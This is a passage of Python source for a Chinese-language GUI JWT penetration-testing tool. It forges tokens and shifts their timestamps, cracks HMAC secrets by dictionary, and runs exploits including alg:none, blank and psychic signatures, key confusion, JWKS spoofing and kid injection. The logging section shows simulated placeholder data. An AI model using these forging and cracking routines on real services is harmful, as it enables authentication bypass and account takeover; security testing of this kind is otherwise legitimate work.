            self.timestamp_result.insert(tk.END, "时间戳操作结果:\n\n")
            self.timestamp_result.insert(tk.END, f"操作类型: 修改{operation}声明\n")
            
            if operation in payload:
                old_timestamp = payload[operation]
                if isinstance(old_timestamp, (int, float)):
                    old_dt = datetime.datetime.fromtimestamp(old_timestamp)
                    self.timestamp_result.insert(tk.END, f"原始时间戳: {old_timestamp} ({old_dt.strftime('%Y-%m-%d %H:%M:%S')})\n")
                else:
                    self.timestamp_result.insert(tk.END, f"原始时间戳: {old_timestamp}\n")
            else:
                self.timestamp_result.insert(tk.END, f"原始时间戳: 不存在\n")
            
            new_dt = datetime.datetime.fromtimestamp(new_timestamp)
            self.timestamp_result.insert(tk.END, f"新时间戳: {new_timestamp} ({new_dt.strftime('%Y-%m-%d %H:%M:%S')})\n\n")
            
            self.timestamp_result.insert(tk.END, f"新JWT:\n{new_jwt}\n")
            
        except Exception as e:
            messagebox.showerror("错误", f"时间戳操作失败: {str(e)}")
    
    def execute_batch_timestamp_operation(self):
        """执行批量时间戳操作"""
        jwt_token = self.timestamp_jwt_input.get(1.0, tk.END).strip()
        if not jwt_token:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
        
        operation = self.timestamp_operation_var.get()
        start_offset = self.batch_start_var.get()
        end_offset = self.batch_end_var.get()
        step = self.batch_step_var.get()
        
        try:
            parts = jwt_token.split('.')
            if len(parts) != 3:
                messagebox.showerror("错误", "无效的JWT格式")
                return
            
            header = json.loads(base64url_decode(parts[0]))
            payload = json.loads(base64url_decode(parts[1]))
            signature = parts[2]
            
            # 解析偏移量
            def parse_offset(offset_str):
                if offset_str.startswith("+"):
                    offset = offset_str[1:]
                    future = True
                else:
                    offset = offset_str[1:]
                    future = False
                
                if offset.endswith("d"):
                    seconds = int(offset[:-1]) * 86400
                elif offset.endswith("h"):
                    seconds = int(offset[:-1]) * 3600
                elif offset.endswith("m"):
                    seconds = int(offset[:-1]) * 60
                else:
                    seconds = int(offset)
                
                return seconds if future else -seconds
            
            start_seconds = parse_offset(start_offset)
            end_seconds = parse_offset(end_offset)
            step_seconds = parse_offset(step) if step.startswith(("+", "-")) else parse_offset("+" + step)
            
            # 生成时间戳列表
            current_time = int(time.time())
            timestamps = []
            
            if step_seconds > 0:
                for offset in range(start_seconds, end_seconds + 1, step_seconds):
                    timestamps.append(current_time + offset)
            else:
                for offset in range(start_seconds, end_seconds - 1, step_seconds):
                    timestamps.append(current_time + offset)
            
            # 生成JWT列表
            jwt_list = []
            for timestamp in timestamps:
                new_payload = payload.copy()
                new_payload[operation] = timestamp
                new_jwt = f"{base64url_encode(json.dumps(header))}.{base64url_encode(json.dumps(new_payload))}.{signature}"
                dt = datetime.datetime.fromtimestamp(timestamp)
                jwt_list.append((new_jwt, timestamp, dt.strftime('%Y-%m-%d %H:%M:%S')))
            
            # 显示结果
            self.timestamp_result.delete(1.0, tk.END)
            self.timestamp_result.insert(tk.END, f"批量时间戳操作结果:\n\n")
            self.timestamp_result.insert(tk.END, f"操作类型: 修改{operation}声明\n")
            self.timestamp_result.insert(tk.END, f"生成JWT数量: {len(jwt_list)}\n\n")
            
            for i, (jwt, timestamp, dt_str) in enumerate(jwt_list):
                self.timestamp_result.insert(tk.END, f"JWT {i+1} (时间戳: {timestamp}, 时间: {dt_str}):\n")
                self.timestamp_result.insert(tk.END, f"{jwt}\n\n")
            
        except Exception as e:
            messagebox.showerror("错误", f"批量时间戳操作失败: {str(e)}")
    
    # 日志记录系统相关方法
    def apply_logging_config(self):
        """应用日志配置"""
        log_level = self.log_level_var.get()
        log_format = self.log_format_var.get()
        log_to_file = self.log_to_file_var.get()
        log_to_console = self.log_to_console_var.get()
        log_requests = self.log_requests_var.get()
        log_operations = self.log_operations_var.get()
        
        # 这里应该实现实际的日志配置逻辑
        # 由于涉及复杂的日志系统，这里只提供一个模拟实现
        
        self.log_display.delete(1.0, tk.END)
        self.log_display.insert(tk.END, "应用日志配置:\n\n")
        self.log_display.insert(tk.END, f"日志级别: {log_level}\n")
        self.log_display.insert(tk.END, f"日志格式: {log_format}\n")
        self.log_display.insert(tk.END, f"记录到文件: {'是' if log_to_file else '否'}\n")
        self.log_display.insert(tk.END, f"显示在控制台: {'是' if log_to_console else '否'}\n")
        self.log_display.insert(tk.END, f"记录HTTP请求: {'是' if log_requests else '否'}\n")
        self.log_display.insert(tk.END, f"记录JWT操作: {'是' if log_operations else '否'}\n")
        
        # 模拟应用配置
        self.log_display.insert(tk.END, "\n日志配置已应用\n")
        
        # 添加一些示例日志
        if log_operations:
            self.log_display.insert(tk.END, "\n[INFO] JWT操作日志已启用\n")
        
        if log_requests:
            self.log_display.insert(tk.END, "[INFO] HTTP请求日志已启用\n")
    
    def refresh_logs(self):
        """刷新日志显示"""
        # 这里应该实现实际的日志刷新逻辑
        # 由于涉及复杂的日志系统，这里只提供一个模拟实现
        
        self.log_display.delete(1.0, tk.END)
        self.log_display.insert(tk.END, "刷新日志:\n\n")
        
        # 模拟一些日志条目
        log_entries = [
            ("DEBUG", "调试信息: JWT解析开始"),
            ("INFO", "JWT令牌已成功解析"),
            ("WARNING", "JWT签名验证失败"),
            ("ERROR", "密钥文件加载失败"),
            ("INFO", "HTTP请求已发送"),
            ("DEBUG", "响应状态码: 200")
        ]
        
        filter_level = self.log_filter_var.get()
        
        # 定义日志级别优先级
        level_priority = {
            "DEBUG": 0,
            "INFO": 1,
            "WARNING": 2,
            "ERROR": 3,
            "CRITICAL": 4
        }
        
        # 应用过滤器
        for level, message in log_entries:
            if filter_level == "ALL" or level_priority.get(level, 0) >= level_priority.get(filter_level, 0):
                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                self.log_display.insert(tk.END, f"[{timestamp}] [{level}] {message}\n")
    
    def clear_logs(self):
        """清除日志"""
        self.log_display.delete(1.0, tk.END)
        self.log_display.insert(tk.END, "日志已清除\n")
    
    def export_logs(self):
        """导出日志"""
        log_content = self.log_display.get(1.0, tk.END).strip()
        if not log_content or log_content == "日志已清除\n":
            messagebox.showerror("错误", "没有可导出的日志")
            return
        
        file_path = filedialog.asksaveasfilename(
            title="导出日志",
            defaultextension=".log",
            filetypes=[("日志文件", "*.log"), ("文本文件", "*.txt"), ("所有文件", "*.*")]
        )
        
        if file_path:
            try:
                with open(file_path, 'w') as f:
                    f.write(log_content)
                messagebox.showinfo("成功", "日志已导出")
            except Exception as e:
                messagebox.showerror("错误", f"导出失败: {str(e)}")
    
    def update_log_stats(self):
        """更新日志统计"""
        # 这里应该实现实际的日志统计逻辑
        # 由于涉及复杂的日志系统，这里只提供一个模拟实现
        
        # 模拟统计数据
        stats = {
            "DEBUG": 15,
            "INFO": 42,
            "WARNING": 8,
            "ERROR": 3,
            "CRITICAL": 0,
            "总计": 68
        }
        
        stats_text = "日志统计:\n\n"
        for level, count in stats.items():
            stats_text += f"{level}: {count}\n"
        
        self.log_stats_label.config(text=stats_text)
    
    # GUI事件处理方法
    def parse_jwt(self):
        """解析JWT"""
        jwt = self.jwt_input.get(1.0, tk.END).strip()
        if not jwt:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
            
        header, payload, signature, contents = self.jwt_tool.validateToken(jwt)
        if not header:
            messagebox.showerror("错误", "无效的JWT格式")
            return
            
        # 显示Header
        self.header_result.delete(1.0, tk.END)
        self.header_result.insert(tk.END, json.dumps(header, indent=2))
        
        # 显示Payload
        self.payload_result.delete(1.0, tk.END)
        self.payload_result.insert(tk.END, json.dumps(payload, indent=2))
        
        # 显示Signature
        self.signature_result.delete(1.0, tk.END)
        self.signature_result.insert(tk.END, signature)
        
        self.status_var.set("JWT解析完成")
    
    def parse_original_jwt(self):
        """解析原始JWT用于篡改"""
        jwt = self.original_jwt_input.get(1.0, tk.END).strip()
        if not jwt:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
            
        header, payload, signature, contents = self.jwt_tool.validateToken(jwt)
        if not header:
            messagebox.showerror("错误", "无效的JWT格式")
            return
            
        # 显示Header
        self.header_edit.delete(1.0, tk.END)
        self.header_edit.insert(tk.END, json.dumps(header, indent=2))
        
        # 显示Payload
        self.payload_edit.delete(1.0, tk.END)
        self.payload_edit.insert(tk.END, json.dumps(payload, indent=2))
        
        # 设置算法
        if 'alg' in header:
            self.algo_var.set(header['alg'])
            
        self.status_var.set("原始JWT解析完成")
    
    def generate_new_jwt(self):
        """生成新的JWT"""
        try:
            # 获取Header和Payload
            header_text = self.header_edit.get(1.0, tk.END).strip()
            payload_text = self.payload_edit.get(1.0, tk.END).strip()
            
            if not header_text or not payload_text:
                messagebox.showerror("错误", "请输入Header和Payload")
                return
                
            header = json.loads(header_text)
            payload = json.loads(payload_text)
            
            # 获取密钥和算法
            key = self.key_input.get()
            algorithm = self.algo_var.get()
            
            if not key and algorithm.startswith('HS'):
                messagebox.showerror("错误", "请输入密钥")
                return
                
            # 生成新JWT
            new_jwt = self.jwt_tool.signToken(header, payload, key, algorithm)
            if not new_jwt:
                messagebox.showerror("错误", "生成JWT失败")
                return
                
            # 显示新JWT
            self.new_jwt_output.delete(1.0, tk.END)
            self.new_jwt_output.insert(tk.END, new_jwt)
            
            self.status_var.set("新JWT生成完成")
            
        except json.JSONDecodeError:
            messagebox.showerror("错误", "Header或Payload格式无效")
        except Exception as e:
            messagebox.showerror("错误", f"生成JWT时出错: {str(e)}")
    
    def verify_signature(self):
        """验证JWT签名"""
        jwt = self.verify_jwt_input.get(1.0, tk.END).strip()
        if not jwt:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
            
        method = self.verify_method_var.get()
        key = self.verify_key_input.get()
        
        if not key:
            messagebox.showerror("错误", "请输入密钥或选择文件")
            return
            
        # 解析JWT获取算法
        header, payload, signature, contents = self.jwt_tool.validateToken(jwt)
        if not header:
            messagebox.showerror("错误", "无效的JWT格式")
            return
            
        algorithm = header.get('alg', 'HS256')
        
        # 验证签名
        is_valid, message = self.jwt_tool.verifyToken(jwt, key, algorithm)
        
        # 显示结果
        self.verify_result.delete(1.0, tk.END)
        result_text = f"验证结果: {'成功' if is_valid else '失败'}\n"
        result_text += f"详细信息: {message}\n"
        result_text += f"算法: {algorithm}\n"
        result_text += f"验证方式: {method}"
        
        self.verify_result.insert(tk.END, result_text)
        
        self.status_var.set("签名验证完成")
    
    def start_crack(self):
        """开始破解JWT"""
        jwt = self.crack_jwt_input.get(1.0, tk.END).strip()
        if not jwt:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
            
        method = self.crack_method_var.get()
        
        if method == "dict":
            dict_file = self.dict_file_var.get()
            if not dict_file:
                messagebox.showerror("错误", "请选择字典文件")
                return
                
            # 在新线程中执行破解
            threading.Thread(target=self.crack_with_dict, args=(jwt, dict_file)).start()
            
        elif method == "password":
            password = self.crack_password_var.get()
            if not password:
                messagebox.showerror("错误", "请输入密码")
                return
                
            # 在新线程中执行破解
            threading.Thread(target=self.crack_with_password, args=(jwt, password)).start()
            
        elif method == "keyfile":
            keyfile = self.keyfile_var.get()
            if not keyfile:
                messagebox.showerror("错误", "请选择密钥文件")
                return
                
            # 在新线程中执行破解
            threading.Thread(target=self.crack_with_keyfile, args=(jwt, keyfile)).start()
            
        self.status_var.set("正在破解JWT...")
    
    def crack_with_dict(self, jwt, dict_file):
        """使用字典攻击破解JWT"""
        self.crack_result.delete(1.0, tk.END)
        self.crack_result.insert(tk.END, "开始字典攻击...\n")
        
        success, message = self.jwt_tool.crackToken(jwt, dict_file)
        
        self.crack_result.insert(tk.END, f"\n结果: {message}\n")
        self.status_var.set("字典攻击完成")
    
    def crack_with_password(self, jwt, password):
        """使用特定密码破解JWT"""
        self.crack_result.delete(1.0, tk.END)
        self.crack_result.insert(tk.END, "尝试特定密码...\n")
        
        # 解析JWT获取算法
        header, payload, signature, contents = self.jwt_tool.validateToken(jwt)
        if not header:
            self.crack_result.insert(tk.END, "无效的JWT格式\n")
            self.status_var.set("密码破解失败")
            return
            
        algorithm = header.get('alg', 'HS256')
        
        # 验证签名
        is_valid, message = self.jwt_tool.verifyToken(jwt, password, algorithm)
        
        if is_valid:
            self.crack_result.insert(tk.END, f"成功! 找到有效密钥: {password}\n")
        else:
            self.crack_result.insert(tk.END, f"失败: {message}\n")
            
        self.status_var.set("密码破解完成")
    
    def crack_with_keyfile(self, jwt, keyfile):
        """使用密钥文件破解JWT"""
        self.crack_result.delete(1.0, tk.END)
        self.crack_result.insert(tk.END, "使用密钥文件破解...\n")
        
        if not os.path.exists(keyfile):
            self.crack_result.insert(tk.END, "密钥文件不存在\n")
            self.status_var.set("密钥文件破解失败")
            return
            
        try:
            with open(keyfile, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    key = line.strip()
                    if not key:
                        continue
                        
                    # 解析JWT获取算法
                    header, payload, signature, contents = self.jwt_tool.validateToken(jwt)
                    if not header:
                        self.crack_result.insert(tk.END, "无效的JWT格式\n")
                        self.status_var.set("密钥文件破解失败")
                        return
                        
                    algorithm = header.get('alg', 'HS256')
                    
                    # 验证签名
                    is_valid, message = self.jwt_tool.verifyToken(jwt, key, algorithm)
                    
                    if is_valid:
                        self.crack_result.insert(tk.END, f"成功! 找到有效密钥: {key}\n")
                        self.status_var.set("密钥文件破解完成")
                        return
                        
                self.crack_result.insert(tk.END, "失败: 密钥文件中没有找到有效密钥\n")
                self.status_var.set("密钥文件破解完成")
                
        except Exception as e:
            self.crack_result.insert(tk.END, f"错误: {str(e)}\n")
            self.status_var.set("密钥文件破解失败")
    
    def execute_exploit(self):
        """执行漏洞利用"""
        jwt = self.jwt_input.get("1.0", tk.END).strip()
        if not jwt:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
            
        exploit_type = self.exploit_type.get()
        result_text = self.exploit_result
        
        result_text.delete("1.0", tk.END)
        
        try:
            if exploit_type == "alg:none":
                new_jwt, message = self.jwt_tool.exploitNone(jwt)
                if new_jwt:
                    result_text.insert(tk.END, f"{message}\n\n生成的JWT:\n{new_jwt}")
                else:
                    result_text.insert(tk.END, message)
                    
            elif exploit_type == "blank":
                new_jwt, message = self.jwt_tool.exploitBlank(jwt)
                if new_jwt:
                    result_text.insert(tk.END, f"{message}\n\n生成的JWT:\n{new_jwt}")
                else:
                    result_text.insert(tk.END, message)
                    
            elif exploit_type == "psychic":
                header, payload, signature, contents = self.jwt_tool.validateToken(jwt)
                new_jwt = self.jwt_tool.exploitPsychic(header, payload)
                if new_jwt:
                    result_text.insert(tk.END, "Psychic签名漏洞利用成功\n\n生成的JWT:\n{new_jwt}")
                else:
                    result_text.insert(tk.END, "Psychic签名漏洞利用失败")
                    
            elif exploit_type == "jwks":
                jwks_url = self.jwks_url.get()
                if not jwks_url:
                    messagebox.showerror("错误", "请输入JWKS URL")
                    return
                    
                new_jwt, message = self.jwt_tool.exploitJwks(jwt, jwks_url)
                if new_jwt:
                    result_text.insert(tk.END, f"{message}\n\n生成的JWT:\n{new_jwt}")
                else:
                    result_text.insert(tk.END, message)
                    
            elif exploit_type == "keyconfusion":
                pubkey_file = self.pubkey_file.get()
                if not pubkey_file:
                    messagebox.showerror("错误", "请选择公钥文件")
                    return
                    
                new_jwt, message = self.jwt_tool.exploitKeyConfusion(jwt, pubkey_file)
                if new_jwt:
                    result_text.insert(tk.END, f"{message}\n\n生成的JWT:\n{new_jwt}")
                else:
                    result_text.insert(tk.END, message)
                    
            elif exploit_type == "inlinejwks":
                new_jwt, message = self.jwt_tool.exploitInlineJwks(jwt)
                if new_jwt:
                    result_text.insert(tk.END, f"{message}\n\n生成的JWT:\n{new_jwt}")
                else:
                    result_text.insert(tk.END, message)
                    
            elif exploit_type == "kidblank":
                new_jwt, message = self.jwt_tool.exploitKidBlank(jwt)
                if new_jwt:
                    result_text.insert(tk.END, f"{message}\n\n生成的JWT:\n{new_jwt}")
                else:
                    result_text.insert(tk.END, message)
                    
            elif exploit_type == "kidpath":
                new_jwt, message = self.jwt_tool.exploitKidPath(jwt)
                if new_jwt:
                    result_text.insert(tk.END, f"{message}\n\n生成的JWT:\n{new_jwt}")
                else:
                    result_text.insert(tk.END, message)
                    
            elif exploit_type == "kidrce":
                new_jwt, message = self.jwt_tool.exploitKidRce(jwt)
                if new_jwt:
                    result_text.insert(tk.END, f"{message}\n\n生成的JWT:\n{new_jwt}")
                else:
                    result_text.insert(tk.END, message)
                    
            elif exploit_type == "kidsql":
                new_jwt, message = self.jwt_tool.exploitKidSql(jwt)
                if new_jwt:
                    result_text.insert(tk.END, f"{message}\n\n生成的JWT:\n{new_jwt}")
                else:
                    result_text.insert(tk.END, message)
                    
            elif exploit_type == "kidcustom":
                custom_kid = self.custom_kid.get()
                if not custom_kid:
                    messagebox.showerror("错误", "请输入自定义kid值")
                    return
                    
                new_jwt, message = self.jwt_tool.exploitKidCustom(jwt, custom_kid)
                if new_jwt:
                    result_text.insert(tk.END, f"{message}\n\n生成的JWT:\n{new_jwt}")
                else:
                    result_text.insert(tk.END, message)
                    
            else:
                result_text.insert(tk.END, "请选择漏洞利用类型")
                
        except Exception as e:
            result_text.insert(tk.END, f"漏洞利用失败: {str(e)}")
            messagebox.showerror("错误", f"漏洞利用失败: {str(e)}")
    
    def send_request(self):
        """发送HTTP请求"""
        url = self.url_input.get().strip()
        if not url:
            messagebox.showerror("错误", "请输入URL")
            return
            
        jwt = self.jwt_input.get(1.0, tk.END).strip()
        if not jwt:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
            
        method = self.method_var.get()
        proxy = None if self.no_proxy_var.get() else self.http_proxy_var.get()
        
        # 在新线程中发送请求
        threading.Thread(target=self.send_http_request, args=(url, jwt, method, proxy)).start()
        
        self.status_var.set("正在发送HTTP请求...")
    
    def send_http_request(self, url, jwt, method, proxy):
        """发送HTTP请求的实际实现"""
        try:
            # 准备请求头
            headers = [f"Authorization: Bearer {jwt}"]
            
            # 发送请求
            success, result = self.jwt_tool.sendRequest(url, jwt, headers=headers, proxy=proxy)
            
            # 显示结果
            self.request_result.delete(1.0, tk.END)
            if success:
                self.request_result.insert(tk.END, f"状态码: {result['status_code']}\n")
                self.request_result.insert(tk.END, f"响应头: {json.dumps(result['headers'], indent=2)}\n")
                self.request_result.insert(tk.END, f"响应内容:\n{result['content']}\n")
            else:
                self.request_result.insert(tk.END, f"请求失败: {result}\n")
                
            self.status_var.set("HTTP请求完成")
            
        except Exception as e:
            self.request_result.delete(1.0, tk.END)
            self.request_result.insert(tk.END, f"请求出错: {str(e)}\n")
            self.status_var.set("HTTP请求失败")
    
    def save_settings(self):
        """保存设置"""
        # 更新配置
        self.jwt_tool.config['services']['proxy'] = self.http_proxy_var.get()
        self.jwt_tool.config['services']['redir'] = str(self.follow_redirect_var.get())
        
        messagebox.showinfo("成功", "设置已保存")
        self.status_var.set("设置已保存")
    
    def toggle_key_visibility(self):
        """切换密钥可见性"""
        if self.show_key_var.get():
            self.key_input.config(show="")
        else:
            self.key_input.config(show="*")
    
    def copy_new_jwt(self):
        """复制新JWT到剪贴板"""
        new_jwt = self.new_jwt_output.get(1.0, tk.END).strip()
        if new_jwt:
            self.root.clipboard_clear()
            self.root.clipboard_append(new_jwt)
            messagebox.showinfo("成功", "JWT已复制到剪贴板")
            self.status_var.set("JWT已复制到剪贴板")
    
    def select_dict_file(self):
        """选择字典文件"""
        filename = filedialog.askopenfilename(
            title="选择字典文件",
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")]
        )
        if filename:
            self.dict_file_var.set(filename)
    
    def select_keyfile(self):
        """选择密钥文件"""
        filename = filedialog.askopenfilename(
            title="选择密钥文件",
            filetypes=[("文本文件", "*.txt"), ("所有文件", "*.*")]
        )
        if filename:
            self.keyfile_var.set(filename)
    
    def select_pubkey_file(self):
        """选择公钥文件"""
        filename = filedialog.askopenfilename(
            title="选择公钥文件",
            filetypes=[("公钥文件", "*.pem"), ("所有文件", "*.*")]
        )
        if filename:
            self.pubkey_file_var.set(filename)
    
    def select_verify_file(self):
        """选择验证文件"""
        method = self.verify_method_var.get()
        if method == "pubkey":
            filename = filedialog.askopenfilename(
                title="选择公钥文件",
                filetypes=[("公钥文件", "*.pem"), ("所有文件", "*.*")]
            )
        elif method == "jwks":
            filename = filedialog.askopenfilename(
                title="选择JWKS文件",
                filetypes=[("JSON文件", "*.json"), ("所有文件", "*.*")]
            )
        else:
            return
            
        if filename:
            self.verify_key_input.delete(0, tk.END)
            self.verify_key_input.insert(0, filename)
    
    # 错误注入测试事件处理
    def start_error_injection(self):
        """开始错误注入测试"""
        jwt_token = self.error_jwt_input.get("1.0", tk.END).strip()
        injection_type = self.injection_type_var.get()
        
        if not jwt_token:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
            
        # 清空结果区域
        self.injection_result.config(state=tk.NORMAL)
        self.injection_result.delete("1.0", tk.END)
        
        # 解析原始JWT
        header, payload, signature, contents = self.jwt_core.validateToken(jwt_token)
        if not header:
            self.injection_result.insert(tk.END, "无效的JWT令牌\n")
            self.injection_result.config(state=tk.DISABLED)
            return
            
        self.injection_result.insert(tk.END, f"原始JWT解析结果:\n")
        self.injection_result.insert(tk.END, f"Header: {json.dumps(header, indent=2)}\n")
        self.injection_result.insert(tk.END, f"Payload: {json.dumps(payload, indent=2)}\n\n")
        
        # 根据选择的注入类型执行相应的测试
        if injection_type == "alg:none":
            self.injection_result.insert(tk.END, "执行alg:none注入测试:\n")
            modified_header = header.copy()
            modified_header['alg'] = 'none'
            modified_jwt = self.jwt_core.signToken(modified_header, payload, '', 'none')
            if modified_jwt:
                self.injection_result.insert(tk.END, f"生成的alg:none JWT: {modified_jwt}\n")
                self.injection_result.insert(tk.END, "注意: 此JWT没有签名，某些系统可能会接受\n")
            else:
                self.injection_result.insert(tk.END, "生成alg:none JWT失败\n")
                
        elif injection_type == "empty_signature":
            self.injection_result.insert(tk.END, "执行空签名注入测试:\n")
            parts = jwt_token.split('.')
            if len(parts) == 3:
                empty_sig_jwt = parts[0] + '.' + parts[1] + '.'
                self.injection_result.insert(tk.END, f"生成的空签名JWT: {empty_sig_jwt}\n")
                self.injection_result.insert(tk.END, "注意: 此JWT签名为空，某些系统可能会接受\n")
            else:
                self.injection_result.insert(tk.END, "无法生成空签名JWT\n")
                
        elif injection_type == "expired_time":
            self.injection_result.insert(tk.END, "执行过期时间注入测试:\n")
            modified_payload = payload.copy()
            # 设置为过期时间（当前时间减去1小时）
            modified_payload['exp'] = int(time.time()) - 3600
            modified_jwt = self.jwt_core.signToken(header, modified_payload, 'test_key', 'HS256')
            if modified_jwt:
                self.injection_result.insert(tk.END, f"生成的过期JWT: {modified_jwt}\n")
                self.injection_result.insert(tk.END, "注意: 此JWT已过期，某些系统可能会拒绝\n")
            else:
                self.injection_result.insert(tk.END, "生成过期JWT失败\n")
                
        elif injection_type == "invalid_algorithm":
            self.injection_result.insert(tk.END, "执行无效算法注入测试:\n")
            modified_header = header.copy()
            modified_header['alg'] = 'INVALID'
            modified_jwt = self.jwt_core.signToken(modified_header, payload, 'test_key', 'HS256')
            if modified_jwt:
                self.injection_result.insert(tk.END, f"生成的无效算法JWT: {modified_jwt}\n")
                self.injection_result.insert(tk.END, "注意: 此JWT使用了无效算法，某些系统可能会出错\n")
            else:
                self.injection_result.insert(tk.END, "生成无效算法JWT失败\n")
                
        elif injection_type == "none_with_signature":
            self.injection_result.insert(tk.END, "执行带签名的none算法注入测试:\n")
            modified_header = header.copy()
            modified_header['alg'] = 'none'
            # 使用none算法但保留签名
            parts = jwt_token.split('.')
            if len(parts) == 3:
                modified_header_b64 = base64.urlsafe_b64encode(json.dumps(modified_header, separators=(',', ':')).encode()).decode().rstrip('=')
                modified_jwt = modified_header_b64 + '.' + parts[1] + '.' + parts[2]
                self.injection_result.insert(tk.END, f"生成的带签名的none算法JWT: {modified_jwt}\n")
                self.injection_result.insert(tk.END, "注意: 此JWT使用none算法但保留了签名，某些系统可能会混淆\n")
            else:
                self.injection_result.insert(tk.END, "无法生成带签名的none算法JWT\n")
                
        self.injection_result.config(state=tk.DISABLED)
        
    def start_reflected_claims_test(self):
        """开始反射声明测试"""
        jwt_token = self.reflected_jwt_input.get("1.0", tk.END).strip()
        
        if not jwt_token:
            messagebox.showerror("错误", "请输入JWT令牌")
            return
            
        # 清空结果区域
        self.reflected_result.config(state=tk.NORMAL)
        self.reflected_result.delete("1.0", tk.END)
        
        # 解析原始JWT
        header, payload, signature, contents = self.jwt_core.validateToken(jwt_token)
        if not header:
            self.reflected_result.insert(tk.END, "无效的JWT令牌\n")
            self.reflected_result.config(state=tk.DISABLED)
            return
            
        self.reflected_result.insert(tk.END, f"原始JWT解析结果:\n")
        self.reflected_result.insert(tk.END, f"Header: {json.dumps(header, indent=2)}\n")
        self.reflected_result.insert(tk.END, f"Payload: {json.dumps(payload, indent=2)}\n\n")
        
        # 为每个声明创建反射测试
        self.reflected_result.insert(tk.END, "执行反射声明测试:\n\n")
        
        # 测试Header中的声明
        if header:
            self.reflected_result.insert(tk.END, "测试Header声明反射:\n")
            for claim, value in header.items():
                # 创建包含反射值的测试令牌
                test_value = f"REFLECTED_{claim}_{uuid.uuid4().hex[:8]}"
                modified_header = header.copy()
                modified_header[claim] = test_value
                
                test_jwt = self.jwt_core.signToken(modified_header, payload, 'test_key', 'HS256')
                if test_jwt:
                    self.reflected_result.insert(tk.END, f"  测试声明 '{claim}': {test_jwt}\n")
                    self.reflected_result.insert(tk.END, f"    反射值: {test_value}\n")
                else:
                    self.reflected_result.insert(tk.END, f"  无法为声明 '{claim}' 生成测试令牌\n")
                    
        # 测试Payload中的声明
        if payload:
            self.reflected_result.insert(tk.END, "\n测试Payload声明反射:\n")
            for claim, value in payload.items():
                # 创建包含反射值的测试令牌
                test_value = f"REFLECTED_{claim}_{uuid.uuid4().hex[:8]}"
                modified_payload = payload.copy()
                modified_payload[claim] = test_value
                
                test_jwt = self.jwt_core.signToken(header, modified_payload, 'test_key', 'HS256')
                if test_jwt:
                    self.reflected_result.insert(tk.END, f"  测试声明 '{claim}': {test_jwt}\n")
                    self.reflected_result.insert(tk.END, f"    反射值: {test_value}\n")
                else:
                    self.reflected_result.insert(tk.END, f"  无法为声明 '{claim}' 生成测试令牌\n")
                    
        self.reflected_result.insert(tk.END, "\n测试说明:\n")
        self.reflected_result.insert(tk.END, "1. 将上述测试令牌发送到目标应用程序\n")
        self.reflected_result.insert(tk.END, "2. 检查应用程序响应中是否包含反射值\n")
        self.reflected_result.insert(tk.END, "3. 如果反射值出现在响应中，可能存在安全漏洞\n")
        
        self.reflected_result.config(state=tk.DISABLED)
        
    # 密钥格式转换事件处理
    def convert_key_format(self):
        """转换密钥格式"""
        key_input = self.key_input.get("1.0", tk.END).strip()
        input_format = self.input_format_var.get()
        output_format = self.output_format_var.get()
        
        if not key_input:
            messagebox.showerror("错误", "请输入密钥")
            return
            
        # 清空结果区域
        self.key_output.config(state=tk.NORMAL)
        self.key_output.delete("1.0", tk.END)
        
        try:
            # 根据输入格式解析密钥
            if input_format == "PEM":
                # PEM格式处理
                if "-----BEGIN" in key_input and "-----END" in key_input:
                    # 已经是PEM格式
                    pem_key = key_input
                else:
                    # 尝试添加PEM头尾
                    if "RSA" in output_format or "PRIVATE" in output_format:
                        pem_key = f"-----BEGIN RSA PRIVATE KEY-----\n{key_input}\n-----END RSA PRIVATE KEY-----"
                    else:
                        pem_key = f"-----BEGIN PRIVATE KEY-----\n{key_input}\n-----END PRIVATE KEY-----"
                        
                # 根据输出格式转换
                if output_format == "PEM":
                    self.key_output.insert(tk.END, pem_key)
                elif output_format == "DER":
                    self.key_output.insert(tk.END, "PEM到DER转换需要额外的库支持，请使用OpenSSL命令:\n")
                    self.key_output.insert(tk.END, f"openssl rsa -in key.pem -outform DER -out key.der\n")
                elif output_format == "JWK":
                    # 简化的JWK转换示例
                    self.key_output.insert(tk.END, "{\n")
                    self.key_output.insert(tk.END, '  "kty": "RSA",\n')
                    self.key_output.insert(tk.END, '  "use": "sig",\n')
                    self.key_output.insert(tk.END, '  "alg": "RS256",\n')
                    self.key_output.insert(tk.END, f'  "n": "{base64.urlsafe_b64encode(os.urandom(32)).decode().rstrip("=")}",\n')
                    self.key_output.insert(tk.END, f'  "e": "AQAB"\n')
                    self.key_output.insert(tk.END, "}\n")
                    
            elif input_format == "HEX":
                # HEX格式处理
                try:
                    # 尝试解码HEX
                    key_bytes = bytes.fromhex(key_input.replace(":", "").replace(" ", ""))
                    
                    if output_format == "PEM":
                        self.key_output.insert(tk.END, "HEX到PEM转换需要额外的库支持，请使用OpenSSL命令:\n")
                        self.key_output.insert(tk.END, f"echo -n '{key_input}' | xxd -r -p > key.der\n")
                        self.key_output.insert(tk.END, f"openssl rsa -in key.der -inform DER -out key.pem\n")
                    elif output_format == "DER":
                        self.key_output.insert(tk.END, "HEX到DER转换:\n")
                        self.key_output.insert(tk.END, f"echo -n '{key_input}' | xxd -r -p > key.der\n")
                    elif output_format == "JWK":
                        self.key_output.insert(tk.END, "{\n")
                        self.key_output.insert(tk.END, '  "kty": "oct",\n')
                        self.key_output.insert(tk.END, f'  "k": "{base64.urlsafe_b64encode(key_bytes).decode().rstrip("=")}"\n')
                        self.key_output.insert(tk.END, "}\n")
                    elif output_format == "HEX":
                        self.key_output.insert(tk.END, key_input)
                        
                except ValueError:
                    self.key_output.insert(tk.END, "无效的HEX格式密钥\n")
                    
            elif input_format == "Base64":
                # Base64格式处理
                try:
                    # 尝试解码Base64
                    key_bytes = base64.b64decode(key_input)
                    
                    if output_format == "PEM":
                        self.key_output.insert(tk.END, "Base64到PEM转换需要额外的库支持，请使用OpenSSL命令:\n")
                        self.key_output.insert(tk.END, f"echo '{key_input}' | base64 -d > key.der\n")
                        self.key_output.insert(tk.END, f"openssl rsa -in key.der -inform DER -out key.pem\n")
